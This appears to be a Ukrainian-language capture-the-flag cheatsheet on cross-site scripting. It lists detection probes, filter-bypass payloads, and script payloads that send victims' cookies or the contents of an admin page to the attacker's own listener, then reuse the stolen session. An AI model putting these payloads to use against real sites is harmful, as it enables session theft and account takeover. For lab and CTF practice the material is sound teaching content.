# Cheatsheet: XSS (Cross-Site Scripting)

Ввід виконується як JS у чужому браузері → крадіжка cookie/сесії адміна, читання прапорця зі сторінки, доступної лише боту/адміну.
На KotH менш цінний за RCE, але вирішує, коли прапорець у чужому профілі або треба сесія адмінки.
← [web-enum](../02-workflows/web-enum.md) · [web-vulns](../04-techniques/web-vulns-overview.md) · exfil-сервер: [netcat](netcat-socat.md)

## Типи (різна тактика)
| Тип | Де | Коли спрацьовує |
|---|---|---|
| Reflected | ввід у відповіді того ж запиту (`?q=`) | відкриває жертва за надісланим посиланням |
| Stored | коментар/профіль/ім'я/тікет | автоматично, коли сторінку відкриє бот/адмін |
| DOM | `location.hash`/`document.write` на клієнті | без участі сервера, у JS |

Stored — найкорисніший: бот/адмін відкриє сам, без соц-інженерії.

## Виявлення (ескалація зондів)
```html
"><svg onload=alert(1)>           <!-- вихід з атрибута/тега -->
'><script>alert(1)</script>
{{constructor.constructor('alert(1)')()}}   <!-- клієнтський шаблон (Angular/Vue) -->
javascript:alert(1)               <!-- у href/src -->
```
Спершу подивитись у **View Source**, у який контекст лягає ввід (тег / атрибут / JS / URL) — від цього залежить вихід.

## Exfil cookie/прапорця на свій сервер
Підняти приймач на VPN-адресі: `python3 -m http.server 8000` (або `nc -lvnp 8000`).
```html
<script>new Image().src='http://10.8.N.x:8000/?c='+encodeURIComponent(document.cookie)</script>
<script>fetch('http://10.8.N.x:8000/?c='+btoa(document.cookie))</script>
<!-- коли цінне не в cookie, а на сторінці (напр. прапорець у адмінці): -->
<script>fetch('/admin').then(r=>r.text()).then(t=>new Image().src='http://10.8.N.x:8000/?d='+encodeURIComponent(t))</script>
```
`HttpOnly` на cookie → красти не cookie, а сам вміст сторінки (другий приклад). Зловлене cookie → підставити у свій запит (`curl -b 'session=...'`).

## Обхід фільтрів
```html
<img src=x onerror=alert(1)>              <!-- без <script> -->
<svg><animate onbegin=alert(1)>
<a href="jav&#x61;script:alert(1)">x</a>  <!-- HTML-entity у ключовому слові -->
<ScRiPt>alert(1)</sCrIpT>                 <!-- регістр -->
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">   <!-- base64-обгортка -->
onerror=alert`1`                          <!-- без дужок (backtick) -->
```
Екранує `<`,`>` → спробувати контекст атрибута (`" onmouseover=...`) або JS-рядка (`';alert(1);//`).

## Пастки / куди далі
- `alert(1)` спрацював → підтверджено; далі — корисний payload (exfil), не лишати `alert`.
- Stored не спрацьовує одразу → чекати бота/адміна (інколи хвилини); перевірити, що payload зберігся без екранування.
- CSP блокує inline-скрипт → шукати дозволений origin/`unsafe-inline`, або вектор без JS (крадіжка через `<form>`/`<img>`).
- Зловлена сесія адміна → доступ до адмінки → flag-hunt у відповідях; креди зі сторінок → [credentials-reuse](../04-techniques/credentials-reuse.md).
